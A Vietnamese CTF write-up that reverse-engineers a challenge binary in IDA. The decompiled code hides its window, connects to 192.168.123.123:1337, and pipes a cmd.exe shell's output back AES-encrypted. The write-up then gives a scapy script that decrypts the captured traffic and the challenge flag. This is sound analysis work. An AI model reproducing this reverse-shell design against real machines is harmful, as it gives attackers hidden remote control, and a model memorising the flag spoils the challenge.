# SECRET 
- Khi mở file binary bằng IDA và phân tích hàm `main`:
```C 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  HWND ConsoleWindow; // eax
  SOCKET v4; // eax
  struct WSAData WSAData; // [esp+10h] [ebp-198h] BYREF

  ConsoleWindow = GetConsoleWindow();
  ShowWindow(ConsoleWindow, 0);
  hMutex = CreateMutexW(0, 0, L"9_5_diem");
  if ( !hMutex || WSAStartup(0x202u, &WSAData) )
    return 1;
  *(_DWORD *)&name.sa_family = 0;
  *(_DWORD *)&name.sa_data[2] = 0;
  *(_DWORD *)&name.sa_data[6] = 0;
  *(_DWORD *)&name.sa_data[10] = 0;
  name.sa_family = 2;
  *(_WORD *)name.sa_data = htons(1337u);
  *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.123.123");
  v4 = socket(2, 1, 6);
  s = v4;
  if ( v4 == -1 )
  {
LABEL_4:
    WSACleanup();
    return 1;
  }
  if ( connect(v4, &name, 16) == -1 )
  {
    closesocket(s);
    goto LABEL_4;
  }
  sub_8E1983();
  ReleaseMutex(hMutex);
  return 0;
}
```
- Trước tiên chương trình tạo `MUTEX OBJECT` nên chúng ta có thể suy đoán rằng bài sẽ có chỗ sử dụng `shared resource` giữa các thread (tức là sẽ có thêm những thread mới được tạo ra)
- Tiếp đến chúng ta có thể thấy rằng chương trình đã kết nối socket đến địa chỉ `192.168.123.123` và  `PORT 1337` : 
```C 
  ..........
  *(_WORD *)name.sa_data = htons(1337u);
  *(_DWORD *)&name.sa_data[2] = inet_addr("192.168.123.123");
  ............
```
- Như vậy đã có kết nối socket thì chắc chắn sẽ có data chứa flag được truyền đi nên chúng ta sẽ tiếp tục trace vào hàm `sub_8E1983` để xem tác giả đã sử dụng socket để gửi đi những gì :
```C
char sub_8E1983()
{
  struct _STARTUPINFOW StartupInfo; // [esp+10h] [ebp-78h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+58h] [ebp-30h] BYREF
  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+68h] [ebp-20h] BYREF
  int CommandLine[4]; // [esp+74h] [ebp-14h] BYREF

  PipeAttributes.nLength = 12;
  PipeAttributes.bInheritHandle = 1;
  PipeAttributes.lpSecurityDescriptor = 0;
  if ( !CreatePipe(&hObject, &hWritePipe, &PipeAttributes, 0) )
    return 0;
  if ( !SetHandleInformation(hObject, 1u, 0) )
    return 0;
  if ( !CreatePipe(&hReadPipe, &dword_8F6330, &PipeAttributes, 0) )
    return 0;
  if ( !SetHandleInformation(dword_8F6330, 1u, 0) )
    return 0;
  CommandLine[0] = *(_DWORD *)L"cmd.exe";
  CommandLine[1] = *(_DWORD *)L"d.exe";
  CommandLine[2] = *(_DWORD *)L"exe";
  CommandLine[3] = *(_DWORD *)L"e";
  memset(&ProcessInformation, 0, sizeof(ProcessInformation));
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.dwFlags |= 0x101u;
  StartupInfo.hStdError = hWritePipe;
  StartupInfo.hStdOutput = hWritePipe;
  StartupInfo.hStdInput = hReadPipe;
  StartupInfo.cb = 68;
  if ( !CreateProcessW(0, (LPWSTR)CommandLine, 0, 0, 1, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
    return 0;
  CreateThread(0, 0, StartAddress, 0, 0, 0);
  CreateThread(0, 0, sub_8E18B3, 0, 0, 0);
  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  return 1;
}
```
- Ở hàm `sub_8E1983` tác giả đã tạo một `pipe` và sau đó tạo một `PROCESS` con để sử dụng `pipe` này (`CreateProcessW`) 
- Process con sẽ chạy commandline bật cmd.exe và chạy d.exe , exe, ....
- Mục tiêu cần trace cuối cùng ở đây là hai hàm `StartAddress` và `sub_8E18B3` :

```C 
  CreateThread(0, 0, StartAddress, 0, 0, 0);
  CreateThread(0, 0, sub_8E18B3, 0, 0, 0);
```

## Trước tiên là function `StartAddress`: 
```C
int __stdcall StartAddress()
{
  void *reader; // ebx
  size_t v1; // ebx
  size_t v2; // esi
  int result; // eax
  const void *v4; // [esp-8h] [ebp-78h]
  DWORD *buf; // [esp+10h] [ebp-60h]
  void *i; // [esp+14h] [ebp-5Ch]
  _DWORD v7[10]; // [esp+18h] [ebp-58h] BYREF
  char v8[40]; // [esp+40h] [ebp-30h] BYREF
  DWORD NumberOfBytesRead; // [esp+68h] [ebp-8h] BYREF

  reader = sub_8E1BC5(0xFFFFu);
  for ( i = reader; ; reader = i )
  {
    memset(reader, 0, 0xFFFFu);
    result = ReadFile(hObject, reader, 0xFFFFu, &NumberOfBytesRead, 0);
    if ( !(_BYTE)result || !NumberOfBytesRead )
      break;
    qmemcpy(v7, sub_8E14F5(NumberOfBytesRead, reader, v8), sizeof(v7));
    v1 = v7[8];
    v2 = v7[8] + 37;
    buf = (DWORD *)sub_8E1BC5(v7[8] + 37);
	..............
```
- Có rất nhiều hàm nên mình sẽ chỉ phân tích một số hàm quan trọng .
- Đầu tiên chương trình sẽ đọc `StdOut` của `pipe` vừa tạo lúc trước , hiểu đơn giản là màn hình console của process được tạo ra trước đó hiện cái gì thì chương trình sẽ đọc tất : 

```C 
	........
	result = ReadFile(hObject, reader, 0xFFFFu, &NumberOfBytesRead, 0);
    if ( !(_BYTE)result || !NumberOfBytesRead )
      break;
    qmemcpy(v7, sub_8E14F5(NumberOfBytesRead, reader, v8), sizeof(v7));
    v1 = v7[8];
	.......
```
- Sau khi đọc xong, tất cả dữ liệu sẽ được đưa vào hàm `sub_8E14F5` để `encrypt` rồi coppy vào biến `v7`
- Tiếp theo biến buf sẽ nhận được những data cần gửi đi :
```C
	..........
	memset(buf, 0, v2);
    *buf = v7[0];
    buf[8] = v1;
    buf[1] = v7[1];
    v4 = (const void *)v7[9];
    buf[2] = v7[2];
    buf[3] = v7[3];
    buf[4] = v7[4];
    buf[5] = v7[5];
    buf[6] = v7[6];
    buf[7] = v7[7];
    memmove(buf + 9, v4, v1);
    if ( send(s, (const char *)buf, v1 + 36, 0) == -1 )
      return closesocket(s);
    j_j__free(buf);
    Sleep(0xAu);
  }
  return result;
}

```
### Phân tích hàm Encrypt `sub_8E14F5`: 

- Đầu vào của hàm `sub_8E14F5`  là `NumberOfBytesRead` ,`reader`, `v8`
   + `NumberOfBytesRead` : số byte
   + `reader` : số byte đã đọc được
   + `v8` : mảng rỗng 
```C
_DWORD *__usercall sub_8E14F5@<eax>(signed int number_of_byte@<edx>, const void *buf@<ecx>, _DWORD *space)
{
   .......
  i = 0;
  Time = getTime(0);
  srand(Time);
  do
  {
    *((_BYTE *)space + i + 16) = rand();
    *((_BYTE *)space + i++) = rand();
  }
  while ( i < 16 );
```
- Đoạn đầu của hàm sử dụng hàm `random` để tạo ra 32 byte đầu bất kì , sau khi trace vào các hàm bên dưới thì mình thấy có một vùng data chương trình sử dụng để trộn với `reader` và `36 byte đầu` kia và những byte đó hoàn toàn giống với `Rijndael S-box` ([S-box](https://en.wikipedia.org/wiki/Rijndael_S-box))
- Nên mình kết luận luôn đây là hàm Encrypt sử dụng `AES` với `Key` và `IV` sẽ là 32 byte random kia.
## Decrypt Data
- Đề bài còn cho chúng ta một file `pcap` để xem những data đã gửi đi nên chúng ta sẽ lấy chúng ra để decrypt 
- Key và IV sẽ là 32 byte đầu 
- Do lúc socket gửi đi , nó có gửi cả `KEY` và `IV` nên chúng ta có thể lấy được nó thông qua file `pcap`
- script mình hack được từ anh tác giả : 
```python 
from scapy.all import *
from Crypto.Cipher import AES 
from Crypto.Util.Padding import * 

pp = PcapNgReader("capture.pcapng")

for p in pp:
    if TCP in p and (p[TCP].dport == 1337 or p[TCP].sport == 1337):
        payload = raw(p[TCP].payload)
        if len(payload) < 36:
            continue
        key = payload[:16]
        iv = payload[16:32]
        size = int.from_bytes(payload[32:36], byteorder='little')
        cipher = AES.new(key, AES.MODE_CBC, iv)
        data = payload[36:36+size]
        data = cipher.decrypt(data)
        try:
            data = unpad(data,16)
        except:
            pass
        print(data.decode())
        # break
```

- FLAG : `KCSC{d0'N7_g1v3_y0u_up}`
